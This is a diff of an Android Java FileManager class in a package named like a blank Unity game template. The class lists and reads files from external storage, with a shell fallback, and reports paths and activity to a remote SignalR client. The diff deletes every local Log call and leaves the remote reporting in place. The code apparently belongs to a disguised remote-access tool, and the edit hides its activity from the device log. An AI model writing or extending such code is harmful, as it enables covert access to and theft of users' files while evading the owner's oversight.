@@ -1,7 +1,6 @@
 package com.UnityTechnologies.com.unity.template.urpblank;
 
 import android.os.Environment;
-import android.util.Log;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.InputStreamReader;
@@ -16,7 +15,6 @@ import java.util.TimeZone;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 public class FileManager {
-    private static final String TAG = "FileManager";
     private static String cachedRootPath = null;
     public static final AtomicBoolean isSearchCancelled = new AtomicBoolean(false);
 
@@ -26,7 +24,6 @@ public class FileManager {
                 cachedRootPath = Environment.getExternalStorageDirectory().getAbsolutePath();
                 SignalRClient.sendClassLog("FileManager", "Success", "Root storage resolved: " + cachedRootPath);
             } catch (Exception e) {
-                Log.e(TAG, "Failed to get external storage path, fallback used: " + e.getMessage());
                 SignalRClient.sendClassLog("FileManager", "Error", "Failed to get external storage path, fallback used: " + e.getMessage());
                 cachedRootPath = "/storage/emulated/0";
             }
@@ -57,12 +54,10 @@ public class FileManager {
             if (canonicalTarget.toLowerCase(Locale.ROOT).startsWith(canonicalRoot.toLowerCase(Locale.ROOT))) {
                 return new File(canonicalTarget);
             } else {
-                Log.w(TAG, "Access denied: Path '" + canonicalTarget + "' outside root '" + canonicalRoot + "'");
                 SignalRClient.sendClassLog("FileManager", "Error", "Access denied: Path '" + canonicalTarget + "' outside root '" + canonicalRoot + "'");
                 return null;
             }
         } catch (Exception e) {
-            Log.e(TAG, "Error resolving path: " + e.getMessage());
             SignalRClient.sendClassLog("FileManager", "Error", "Error resolving path: " + e.getMessage());
             return null;
         }
@@ -246,7 +241,6 @@ public class FileManager {
             process.waitFor();
             SignalRClient.sendClassLog("FileManager", "Success", "Shell fallback listed " + list.size() + " entries for " + dir.getAbsolutePath());
         } catch (Exception e) {
-            Log.e(TAG, "Shell fallback error for " + dir.getAbsolutePath() + ": " + e.getMessage());
             SignalRClient.sendClassLog("FileManager", "Error", "Shell fallback error for " + dir.getAbsolutePath() + ": " + e.getMessage());
         }
         return list.toArray(new File[0]);
@@ -298,7 +292,6 @@ public class FileManager {
             }
             return buffer;
         } catch (Exception e) {
-            Log.e(TAG, "Failed to read chunk for " + targetFile.getPath() + ": " + e.getMessage(), e);
             SignalRClient.sendClassLog("FileManager", "Error", "Failed to read chunk for " + targetFile.getPath() + ": " + e.getMessage());
             return new byte[0];
         }
